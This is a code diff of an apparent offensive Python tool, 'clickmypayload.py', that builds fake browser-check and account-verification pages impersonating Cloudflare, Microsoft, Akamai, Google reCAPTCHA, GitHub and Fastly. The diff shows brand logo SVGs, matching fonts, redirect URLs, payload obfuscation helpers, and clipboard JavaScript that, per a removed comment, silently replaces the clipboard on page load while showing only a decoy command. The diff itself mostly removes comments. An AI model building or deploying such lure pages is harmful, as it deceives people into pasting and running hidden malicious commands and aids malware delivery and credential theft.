@@ -30,12 +30,12 @@ BANNER = f"""{C.CYAN}{C.BOLD}
 {C.RESET}"""
 
 TEMPLATES = {
-    '1': 'Cloudflare — Browser Check',
-    '2': 'Microsoft — Account Verification',
-    '3': 'Akamai — Access Check',
-    '4': 'Google — reCAPTCHA',
-    '5': 'GitHub — Account Verification',
-    '6': 'Fastly — Access Verification',
+    '1': 'Cloudflare  Browser Check',
+    '2': 'Microsoft  Account Verification',
+    '3': 'Akamai  Access Check',
+    '4': 'Google  reCAPTCHA',
+    '5': 'GitHub  Account Verification',
+    '6': 'Fastly  Access Verification',
     '7': 'Custom',
 }
 
@@ -56,9 +56,6 @@ REDIRECT_URLS = {
     '6': 'https://www.fastly.com',
 }
 
-# ---------------------------------------------------------------------------
-# Obfuscation helpers
-# ---------------------------------------------------------------------------
 
 def rand_var(n=8):
     return ''.join(random.choices(string.ascii_lowercase, k=n))
@@ -104,9 +101,6 @@ def obfuscate_payload(cmd, method):
     if method == '5': return multistage_obf(cmd)
     return cmd
 
-# ---------------------------------------------------------------------------
-# Clipboard JS — fires silently on page load; cmd-box shows only decoy
-# ---------------------------------------------------------------------------
 
 def make_clipboard_js(obf_cmd, payload_path=None):
     v_clip  = rand_var()
@@ -157,16 +151,10 @@ setTimeout(function(){{URL.revokeObjectURL({v_url});}},5000);"""
 
     return clip_js
 
-# ---------------------------------------------------------------------------
-# Official SVG logos (sourced from brand guides / official CDNs)
-# ---------------------------------------------------------------------------
-
-# Cloudflare — official cloud mark path (from cloudflare/kumo and fa6-brands icon set)
 CLOUDFLARE_LOGO_SVG = '''<svg class="logo-icon" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
   <path fill="#f6821f" d="M22.01 22.458c.198-.672.12-1.292-.208-1.75-.297-.422-.802-.667-1.411-.698l-11.547-.146a.201.201 0 01-.177-.099.28.28 0 01-.031-.208.328.328 0 01.276-.203l11.646-.151c1.38-.068 2.88-1.182 3.406-2.552l.661-1.734a.338.338 0 00.021-.224 7.571 7.571 0 00-7.401-5.927 7.585 7.585 0 00-7.182 5.146 3.435 3.435 0 00-2.391-.661 3.406 3.406 0 00-3.047 3.047c-.036.411-.01.818.083 1.188A4.85 4.85 0 000 22.34c0 .229.021.464.047.703a.234.234 0 00.224.193h21.307a.296.296 0 00.276-.203zm3.678-7.416c-.104 0-.214 0-.318.016-.078 0-.141.057-.172.13l-.448 1.568c-.198.672-.125 1.292.208 1.755.297.422.807.661 1.417.693l2.453.151c.078 0 .141.031.182.094a.277.277 0 01.026.203.307.307 0 01-.271.208l-2.563.151c-1.391.063-2.88 1.182-3.406 2.552l-.182.479c-.042.094.026.188.13.188h8.797a.24.24 0 00.224-.167 6.153 6.153 0 00.234-1.708c0-3.469-2.833-6.302-6.313-6.302z"/>
 </svg>'''
 
-# Microsoft — 4-square CSS grid (accurate to Fluent design system)
 MICROSOFT_LOGO_HTML = '''<div class="ms-logo">
   <span style="background:#f25022"></span>
   <span style="background:#7fba00"></span>
@@ -174,7 +162,6 @@ MICROSOFT_LOGO_HTML = '''<div class="ms-logo">
   <span style="background:#ffb900"></span>
 </div>'''
 
-# Akamai — double-arc wave mark (closely matching official 2024+ brand identity)
 AKAMAI_LOGO_SVG = '''<svg width="36" height="22" viewBox="0 0 180 70" xmlns="http://www.w3.org/2000/svg">
   <!-- Lower wave -->
   <path fill="#009bde" d="
@@ -204,7 +191,7 @@ AKAMAI_LOGO_SVG = '''<svg width="36" height="22" viewBox="0 0 180 70" xmlns="htt
     Z"/>
 </svg>'''
 
-# Google — standard multi-color G mark rendered at display size (matches google.com favicon style)
+
 GOOGLE_LOGO_SVG = '''<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="44" height="44">
   <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
   <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
@@ -213,57 +200,48 @@ GOOGLE_LOGO_SVG = '''<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48"
   <path fill="none" d="M0 0h48v48H0z"/>
 </svg>'''
 
-# reCAPTCHA widget logo (simplified, matching real widget)
+
 RECAPTCHA_LOGO_SVG = '''<svg width="32" height="32" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
   <circle cx="32" cy="32" r="30" fill="none" stroke="#d2d2d2" stroke-width="2"/>
   <path d="M20 32 Q32 16 44 32 Q32 48 20 32Z" fill="#4a90d9"/>
   <circle cx="32" cy="32" r="8" fill="none" stroke="#d2d2d2" stroke-width="2"/>
 </svg>'''
 
-# GitHub — official Octocat SVG path (from github.com primer)
 GITHUB_LOGO_SVG = '''<svg width="28" height="28" viewBox="0 0 16 16" fill="#e6edf3" xmlns="http://www.w3.org/2000/svg">
   <path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/>
 </svg>'''
 
-# Fastly — official F-mark (red square with rounded corner + F letterform)
 FASTLY_LOGO_SVG = '''<svg width="28" height="28" viewBox="0 0 28 28" xmlns="http://www.w3.org/2000/svg">
   <rect width="28" height="28" rx="4" fill="#ff282d"/>
   <path fill="#ffffff" d="M7 7h14v3.5H10.5V14H19v3.5h-8.5V21H7z"/>
 </svg>'''
 
-# ---------------------------------------------------------------------------
-# Google Fonts @import strings (loaded in <style>)
-# ---------------------------------------------------------------------------
 
-# Cloudflare: Inter (official brand font — open source, Google Fonts)
+
 CF_FONT_IMPORT = "@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');"
 CF_FONT_STACK  = "'Inter', system-ui, sans-serif"
 
-# Microsoft: Georgia serif stack matching real Microsoft account sign-in pages
 MS_FONT_IMPORT = ""
 MS_FONT_STACK  = "Georgia, 'Times New Roman', serif"
 
-# Akamai: Instrument Sans (official 2026 brand font — open source, Google Fonts)
+
 AK_FONT_IMPORT = "@import url('https://fonts.googleapis.com/css2?family=Instrument+Sans:wght@400;500;600;700&display=swap');"
 AK_FONT_STACK  = "'Instrument Sans', system-ui, sans-serif"
 
-# Google: Roboto (public web fallback used on accounts.google.com)
+
 GG_FONT_IMPORT = "@import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&family=Roboto+Mono:wght@400&display=swap');"
 GG_FONT_STACK  = "'Roboto', system-ui, sans-serif"
 GG_MONO_STACK  = "'Roboto Mono', monospace"
 
-# GitHub: system font stack (Primer design system)
+
 GH_FONT_IMPORT = ""
 GH_FONT_STACK  = "-apple-system, BlinkMacSystemFont, 'Segoe UI', 'Noto Sans', Helvetica, Arial, sans-serif"
 GH_MONO_STACK  = "ui-monospace, SFMono-Regular, 'SF Mono', Menlo, Consolas, 'Liberation Mono', monospace"
 
-# Fastly: Inter (official web/Google font per brand.fastly.com)
+
 FT_FONT_IMPORT = "@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');"
 FT_FONT_STACK  = "'Inter', system-ui, sans-serif"
 
-# ---------------------------------------------------------------------------
-# HTML Templates
-# ---------------------------------------------------------------------------
 
 CLOUDFLARE_HTML = '''<!DOCTYPE html>
 <html lang="en">
@@ -932,12 +910,12 @@ def main():
     {cyan('-r, --redirect')}  Override post-verify redirect URL
 
   {bold('Font sources (verified):')}
-    Cloudflare  → Inter (Google Fonts — brand.cloudflare.com)
-    Microsoft   → Segoe UI (system font — Fluent design system)
-    Akamai      → Instrument Sans (Google Fonts — 2026 brand guide)
-    Google      → Roboto (Google Fonts — accounts.google.com fallback)
+    Cloudflare  → Inter (Google Fonts  brand.cloudflare.com)
+    Microsoft   → Segoe UI (system font  Fluent design system)
+    Akamai      → Instrument Sans (Google Fonts  2026 brand guide)
+    Google      → Roboto (Google Fonts  accounts.google.com fallback)
     GitHub      → System font stack (Primer design system)
-    Fastly      → Inter (Google Fonts — brand.fastly.com)
+    Fastly      → Inter (Google Fonts  brand.fastly.com)
 
   {bold('Examples:')}
     python3 clickmypayload.py
